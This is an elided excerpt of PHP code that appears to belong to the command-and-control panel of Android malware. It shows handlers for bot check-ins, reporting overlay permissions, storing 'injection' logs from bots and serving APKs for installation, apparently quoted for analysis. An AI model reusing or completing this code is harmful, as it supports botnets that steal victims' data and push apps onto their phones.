...
switch ($operation) {
    ...
    case "botcheck":// Check bot to admin panel
		...
		$statUnknownInstall = isset($jsonDecode->{'statUnknownInstall'}) ? $jsonDecode->{'statUnknownInstall'} : "";

		$statExternal = isset($jsonDecode->{'statExternal'}) ? $jsonDecode->{'statExternal'} : "";

		$statDrawOver = isset($jsonDecode->{'statDrawOver'}) ? $jsonDecode->{'statDrawOver'} : "";
	...
	case "sendInjectLogs": //Send Logs Injections       
		...
		$tag = isset($jsonDecode->{'tag'}) ? $jsonDecode->{'tag'} : "test";

		echo encrypt($bots_con->addInjection($ip, $idbot, $idInject, $application, $dataInjection, $tag), key);	
	...
	case "getinstallapk": //Get apk for install 

		$ip = $bots_con->getIpBot();
		$app = isset($jsonDecode->{'app'}) ? $jsonDecode->{'app'} : "";

		echo encrypt($bots_con->getInstallApp($ip, $app), key);	
